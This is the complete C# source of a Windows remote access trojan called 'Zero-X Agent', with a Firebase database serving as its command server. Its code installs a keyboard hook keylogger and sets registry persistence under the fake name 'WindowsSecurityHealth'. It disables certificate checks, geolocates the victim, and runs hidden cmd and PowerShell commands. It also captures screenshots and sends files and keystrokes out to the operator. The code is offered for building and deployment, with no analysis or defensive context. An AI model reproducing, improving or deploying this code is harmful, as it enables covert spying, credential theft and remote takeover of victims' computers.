// ─────────────────────────────────────────────────────────────────────────────
//  Zero-X Agent  ·  Agent.cs
//  Language: C# (.NET 4.8 — ships with every modern Windows, no runtime needed)
//  Backend:  Firebase Realtime Database (REST over HttpClient / HTTPS)
//
//  COMPILE (one-liner after installing .NET SDK — see README):
//    csc /target:winexe /optimize+ /out:template.exe Agent.cs
//        /reference:System.Net.Http.dll
//        /reference:System.Web.Extensions.dll
//
//  OR with dotnet CLI (recommended):
//    dotnet publish -c Release -r win-x64 --self-contained false
//
//  Patchable slots (UTF-16LE sequences — dashboard patches these at download):
//    FB_HOST  — 128 × 'F'   Firebase hostname  (no https://, no trailing /)
//    FB_TOKEN —  80 × 'T'   Firebase database secret
//    OWNER_ID —  32 × 'D'   Owner's Discord snowflake ID
// ─────────────────────────────────────────────────────────────────────────────

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

// ── Suppress obsolete warnings for Registry and WebClient on older targets ───
#pragma warning disable CS0618

namespace ZeroX
{
    // ─────────────────────────────────────────────────────────────────────────
    //  Patchable config  (dashboard stamps real values at download time)
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Cfg
    {
        // 128 F's  →  patched to e.g. "myproject-default-rtdb.firebaseio.com"
        internal static string FbHost  = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
        // 80 T's   →  patched to Firebase database secret
        internal static string FbToken = "TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT";
        // 32 D's   →  patched to owner Discord snowflake ID
        internal static string OwnerId = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";

        internal static bool IsPatched =>
            FbHost[0] != 'F' && FbToken[0] != 'T';

        internal static string FbBase =>
            "https://" + FbHost.TrimEnd('\0').Trim();

        internal static string CleanToken =>
            FbToken.TrimEnd('\0').Trim();

        internal static string CleanOwnerId =>
            OwnerId.TrimEnd('\0').Trim();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Tiny JSON helpers  (no Newtonsoft dependency)
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Json
    {
        internal static string Esc(string s)
        {
            if (s == null) return "";
            var sb = new StringBuilder(s.Length + 8);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"':  sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < 0x20) sb.AppendFormat("\\u{0:x4}", (int)c);
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        internal static string Get(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return "";
            string needle = "\"" + key + "\":\"";
            int pos = json.IndexOf(needle, StringComparison.Ordinal);
            if (pos < 0) return "";
            pos += needle.Length;
            int end = pos;
            while (end < json.Length)
            {
                if (json[end] == '\\') { end += 2; continue; }
                if (json[end] == '"')  break;
                end++;
            }
            return json.Substring(pos, end - pos);
        }

        internal static double GetNum(string json, string key)
        {
            string needle = "\"" + key + "\":";
            int pos = json.IndexOf(needle, StringComparison.Ordinal);
            if (pos < 0) return 0;
            pos += needle.Length;
            while (pos < json.Length && json[pos] == ' ') pos++;
            int end = pos;
            while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '.' || json[end] == '-')) end++;
            if (end == pos) return 0;
            return double.TryParse(json.Substring(pos, end - pos),
                System.Globalization.NumberStyles.Float,
                System.Globalization.CultureInfo.InvariantCulture, out double v) ? v : 0;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Firebase REST client
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Fb
    {
        private static readonly HttpClient _http;

        static Fb()
        {
            ServicePointManager.SecurityProtocol =
                SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
            // Accept all certs (handles edge-case chain issues on older Windows)
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            _http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
        }

        private static string Url(string path) =>
            $"{Cfg.FbBase}{path}.json?auth={Cfg.CleanToken}";

        internal static string Get(string path)
        {
            try { return _http.GetStringAsync(Url(path)).Result; }
            catch { return null; }
        }

        internal static bool Put(string path, string json)
        {
            try
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var res = _http.PutAsync(Url(path), content).Result;
                return res.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        internal static bool Patch(string path, string json)
        {
            try
            {
                var req = new HttpRequestMessage(new HttpMethod("PATCH"), Url(path))
                    { Content = new StringContent(json, Encoding.UTF8, "application/json") };
                var res = _http.SendAsync(req).Result;
                return res.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        internal static bool Delete(string path)
        {
            try
            {
                var res = _http.DeleteAsync(Url(path)).Result;
                return res.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  WinAPI P/Invoke for keylogger
    // ─────────────────────────────────────────────────────────────────────────
    internal static class WinApi
    {
        public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public uint   vkCode;
            public uint   scanCode;
            public uint   flags;
            public uint   time;
            public IntPtr dwExtraInfo;
        }

        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN     = 0x0100;
        public const int WM_SYSKEYDOWN  = 0x0104;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Keylogger
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Keylogger
    {
        private static IntPtr            _hook = IntPtr.Zero;
        private static WinApi.HookProc   _proc;   // keep alive
        private static readonly StringBuilder _buf = new StringBuilder();
        private static readonly object         _lk  = new object();

        internal static void Start()
        {
            _proc = HookCallback;
            using var cur = Process.GetCurrentProcess();
            using var mod = cur.MainModule;
            _hook = WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL, _proc,
                WinApi.GetModuleHandle(mod.ModuleName), 0);
        }

        internal static string Flush()
        {
            lock (_lk)
            {
                string s = _buf.Length > 0 ? _buf.ToString() : "(no keystrokes recorded)";
                _buf.Clear();
                return s;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN ||
                               wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
            {
                var kbs = Marshal.PtrToStructure<WinApi.KBDLLHOOKSTRUCT>(lParam);
                lock (_lk)
                {
                    switch (kbs.vkCode)
                    {
                        case 0x08: _buf.Append("<BS>");     break;
                        case 0x09: _buf.Append("<TAB>");    break;
                        case 0x0D: _buf.Append("<ENTER>\n");break;
                        case 0x1B: _buf.Append("<ESC>");    break;
                        case 0x2E: _buf.Append("<DEL>");    break;
                        case 0x20: _buf.Append(' ');        break;
                        default:
                            char c = (char)kbs.vkCode;
                            if (c >= 0x20 && c < 0x7F) _buf.Append(c);
                            else _buf.AppendFormat("<{0:X2}>", kbs.vkCode);
                            break;
                    }
                    if (_buf.Length > 65536) _buf.Remove(0, 32768);
                }
            }
            return WinApi.CallNextHookEx(_hook, nCode, wParam, lParam);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Screenshot
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Screen
    {
        internal static string Capture()
        {
            var bounds = SystemInformation.VirtualScreen;
            using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
            using var g   = Graphics.FromImage(bmp);
            g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
            using var ms  = new MemoryStream();
            bmp.Save(ms, ImageFormat.Png);
            return Convert.ToBase64String(ms.ToArray());
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  System info
    // ─────────────────────────────────────────────────────────────────────────
    internal static class SysInfo
    {
        internal static string Hostname  => Environment.MachineName;
        internal static string OsUser    => Environment.UserName;
        internal static string OsVersion => Environment.OSVersion.ToString();
        internal static string Arch      => Environment.Is64BitOperatingSystem ? "x64" : "x86";
        internal static string RamMb
        {
            get
            {
                var info = new Microsoft.VisualBasic.Devices.ComputerInfo();
                return (info.TotalPhysicalMemory / (1024 * 1024)).ToString();
            }
        }

        internal static string ProcessList()
        {
            var sb = new StringBuilder();
            foreach (var p in Process.GetProcesses().OrderBy(x => x.Id))
            {
                try   { sb.AppendLine($"[{p.Id,6}]  {p.ProcessName}"); }
                catch { /* access denied on some system processes */ }
                if (sb.Length > 32768) { sb.AppendLine("(truncated)"); break; }
            }
            return sb.Length > 0 ? sb.ToString() : "(no processes)";
        }

        internal static string Full(string publicIp) =>
            $"Hostname  : {Hostname}\n" +
            $"Username  : {OsUser}\n"   +
            $"OS        : {OsVersion}\n"+
            $"Arch      : {Arch}\n"     +
            $"Public IP : {publicIp}\n" +
            $"Client ID : {Agent.ClientId}\n";
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Geolocation
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Geo
    {
        internal struct Info
        {
            internal string Ip, City, Country, Lat, Lon;
        }

        internal static Info Locate()
        {
            Info g = default;
            try
            {
                using var wc = new WebClient();
                wc.Headers[HttpRequestHeader.UserAgent] = "ZX/1.0";
                g.Ip = wc.DownloadString("https://api.ipify.org").Trim();
                if (string.IsNullOrEmpty(g.Ip)) g.Ip = "0.0.0.0";

                string json = wc.DownloadString(
                    $"http://ip-api.com/json/{g.Ip}?fields=city,country,lat,lon");
                g.City    = Json.Get(json, "city");
                g.Country = Json.Get(json, "country");
                double lat = Json.GetNum(json, "lat");
                double lon = Json.GetNum(json, "lon");
                g.Lat = lat.ToString("F4", System.Globalization.CultureInfo.InvariantCulture);
                g.Lon = lon.ToString("F4", System.Globalization.CultureInfo.InvariantCulture);
            }
            catch
            {
                g.Ip = g.Ip ?? "0.0.0.0";
                g.City = g.Country = "Unknown";
                g.Lat = g.Lon = "0";
            }
            return g;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Shell execution
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Shell
    {
        internal static string Run(string cmd, bool powershell = false)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = powershell ? "powershell.exe" : "cmd.exe",
                    Arguments              = powershell
                                               ? $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{cmd}\""
                                               : $"/c {cmd}",
                    UseShellExecute        = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    CreateNoWindow         = true,
                    WindowStyle            = ProcessWindowStyle.Hidden,
                };
                using var p = Process.Start(psi);
                string stdout = p.StandardOutput.ReadToEnd();
                string stderr = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                string combined = stdout + (stderr.Length > 0 ? "\n[stderr]\n" + stderr : "");
                if (combined.Length > 65536) combined = combined.Substring(0, 65536) + "\n(capped)";
                return string.IsNullOrWhiteSpace(combined) ? "(no output)" : combined;
            }
            catch (Exception ex) { return $"(exec error: {ex.Message})"; }
        }

        internal static string ListDir(string path)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(path)) path = @"C:\";
                var di   = new DirectoryInfo(path);
                var sb   = new StringBuilder();
                foreach (var d in di.GetDirectories())
                    sb.AppendLine($"<DIR>   {"":12}  {d.Name}");
                foreach (var f in di.GetFiles())
                    sb.AppendLine($"       {f.Length,12}  {f.Name}");
                return sb.Length > 0 ? sb.ToString() : "(empty)";
            }
            catch (Exception ex) { return $"(ls error: {ex.Message})"; }
        }

        internal static string ReadFileB64(string path)
        {
            try
            {
                var fi = new FileInfo(path);
                if (!fi.Exists) return "(file not found)";
                if (fi.Length > 4 * 1024 * 1024) return "(file too large — max 4 MB)";
                return Convert.ToBase64String(File.ReadAllBytes(path));
            }
            catch (Exception ex) { return $"(read error: {ex.Message})"; }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Persistence
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Persist
    {
        private const string RegKey  = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string ValName = "WindowsSecurityHealth";

        internal static void Install()
        {
            try
            {
                string path = Process.GetCurrentProcess().MainModule.FileName;
                using var key = Registry.CurrentUser.OpenSubKey(RegKey, true);
                key?.SetValue(ValName, path);
            }
            catch { /* silently fail if no permission */ }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Client ID (persisted in registry across reboots)
    // ─────────────────────────────────────────────────────────────────────────
    internal static class ClientIdStore
    {
        private const string RegKey  = @"SOFTWARE\ZeroX";
        private const string ValName = "ClientId";

        internal static string GetOrCreate()
        {
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(RegKey);
                string id = key?.GetValue(ValName) as string;
                if (!string.IsNullOrEmpty(id)) return id;
                id = Guid.NewGuid().ToString("N").ToUpper();
                key?.SetValue(ValName, id);
                return id;
            }
            catch { return Guid.NewGuid().ToString("N").ToUpper(); }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Main agent logic
    // ─────────────────────────────────────────────────────────────────────────
    internal static class Agent
    {
        internal static string ClientId;
        private  static string _publicIp = "0.0.0.0";
        private  static string _lastCmdId = "";

        // Unix-ms timestamp
        private static long NowMs() =>
            (long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds;

        // ── Owner verification ──────────────────────────────────────────────
        private static bool VerifyOwner()
        {
            string oid = Cfg.CleanOwnerId;
            if (string.IsNullOrEmpty(oid) || oid.Replace("D", "").Length == 0) return true;
            string raw = Fb.Get("/owner");
            if (string.IsNullOrEmpty(raw) || raw == "null") return true;
            return Json.Get(raw, "discord_id") == oid;
        }

        // ── Check-in ────────────────────────────────────────────────────────
        private static void CheckIn(Geo.Info geo)
        {
            string json =
                $"{{\"ip\":\"{Json.Esc(geo.Ip)}\"," +
                $"\"city\":\"{Json.Esc(geo.City)}\"," +
                $"\"country\":\"{Json.Esc(geo.Country)}\"," +
                $"\"lat\":{geo.Lat}," +
                $"\"lon\":{geo.Lon}," +
                $"\"hostname\":\"{Json.Esc(SysInfo.Hostname)}\"," +
                $"\"os_user\":\"{Json.Esc(SysInfo.OsUser)}\"," +
                $"\"os_ver\":\"{Json.Esc(SysInfo.OsVersion)}\"," +
                $"\"arch\":\"{SysInfo.Arch}\"," +
                $"\"last_seen\":{NowMs()}," +
                $"\"status\":\"online\"}}";
            Fb.Patch($"/clients/{ClientId}", json);
        }

        // ── Heartbeat ───────────────────────────────────────────────────────
        private static void Heartbeat() =>
            Fb.Patch($"/clients/{ClientId}",
                $"{{\"last_seen\":{NowMs()},\"status\":\"online\"}}");

        // ── Post result back ────────────────────────────────────────────────
        private static void PostResult(string cmdId, string output)
        {
            string json =
                $"{{\"cmd_id\":\"{Json.Esc(cmdId)}\"," +
                $"\"output\":\"{Json.Esc(output)}\"," +
                $"\"ts\":{NowMs()}}}";
            Fb.Put($"/clients/{ClientId}/cmd_result", json);
        }

        // ── Poll and execute ────────────────────────────────────────────────
        private static void PollAndExecute()
        {
            string raw = Fb.Get($"/clients/{ClientId}/pending_cmd");
            if (string.IsNullOrEmpty(raw) || raw == "null") return;

            string cmdId   = Json.Get(raw, "id");
            string type    = Json.Get(raw, "type");
            string payload = Json.Get(raw, "payload");

            if (string.IsNullOrEmpty(cmdId) || cmdId == _lastCmdId) return;
            _lastCmdId = cmdId;

            string result;
            switch (type)
            {
                case "shell":      result = Shell.Run(payload);              break;
                case "ps":         result = Shell.Run(payload, true);        break;
                case "screenshot": result = Screen.Capture();                break;
                case "sysinfo":    result = SysInfo.Full(_publicIp);         break;
                case "keylog":     result = Keylogger.Flush();               break;
                case "ls":         result = Shell.ListDir(payload);          break;
                case "download":   result = Shell.ReadFileB64(payload);      break;
                case "pslist":     result = SysInfo.ProcessList();           break;
                case "kill":
                    PostResult(cmdId, "Agent terminating.");
                    Environment.Exit(0);
                    return;
                default:
                    result = $"(unknown command type: {type})";
                    break;
            }

            PostResult(cmdId, result);
        }

        // ── Entry ────────────────────────────────────────────────────────────
        [STAThread]
        internal static void Main()
        {
            // Single-instance mutex
            bool created;
            var mutex = new Mutex(true, "ZeroX_Agent_Mutex", out created);
            if (!created) return;

            // Verify config was patched
            if (!Cfg.IsPatched) return;

            ClientId = ClientIdStore.GetOrCreate();
            Persist.Install();
            Keylogger.Start();

            // Message pump thread (keeps keyboard hook alive)
            var pumpThread = new Thread(Application.Run) { IsBackground = true };
            pumpThread.SetApartmentState(ApartmentState.STA);
            pumpThread.Start();

            // Owner check
            if (!VerifyOwner()) { Thread.Sleep(3000); return; }

            // First check-in
            var geo = Geo.Locate();
            _publicIp = geo.Ip;
            CheckIn(geo);

            // Main loop
            int heartbeatTick = 0;
            while (true)
            {
                try { PollAndExecute(); }
                catch { /* swallow any transient errors */ }

                heartbeatTick++;
                if (heartbeatTick >= 10)   // 10 × 2s = heartbeat every 20s
                {
                    heartbeatTick = 0;
                    try { Heartbeat(); } catch { }
                }

                Thread.Sleep(2000);
            }
        }
    }
}
